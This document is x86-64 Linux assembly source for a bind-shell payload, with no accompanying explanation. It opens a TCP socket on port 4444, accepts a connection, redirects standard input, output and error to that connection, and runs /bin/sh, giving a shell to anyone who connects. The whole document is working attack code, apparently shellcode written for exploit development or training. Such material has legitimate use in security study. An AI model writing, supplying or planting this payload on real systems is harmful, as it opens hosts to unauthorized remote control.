global _start

_start:
      ;sock call part
      
      mov rax,41  ; syscall number for socket
      mov rdi,2   ; AF_INET
      mov rsi,1   ; SOCK_STREAM
      mov rdx,0   ; INADDR_ANY
      syscall
      
      mov rdi,rax   ; save the sock syscall value in rdi
      
      xor rax,rax
      push rax       ; push 8 byte of zeros into the stack
      
      mov [rsp-4],eax
      mov [rsp-6],0x5c11   ; port 4444 that will be bind in hex
      mov [rsp-8],0x2      ; AF_INET
      sub rsp,8
      
     ;bind_socket syscall  
     mov rax, 49    
     mov rsi, rsp
     mov rdx, 16
     syscall 
     
     ;listen syscall
     mov rax, 50
     mov rsi, 2
     syscall
     
     ;accept syscall
     mov rax, 43
     sub rsp, 16
     mov rsi, rsp
     mov byte [rsp-1], 16
     sub rsp, 1
     mov rdx, rsp
     syscall 
     
     ; store the client socket description
     mov r9, rax 
     
     ;close parent syscall
     mov rax, 3
     syscall
     
     mov rdi, r9
     mov rax, 33
     mov rsi, 0
     syscall

     mov rax, 33
     mov rsi, 1
     syscall

     mov rax, 33
     mov rsi, 2
     syscall
     
     ;shell_code
     xor rax, rax
     push rax
     mov rbx, 0x68732f2f6e69622f
     push rbx
     mov rdi, rsp
     push rax
     mov rdx, rsp
     push rdi
     mov rsi, rsp
     add rax, 59
     syscall
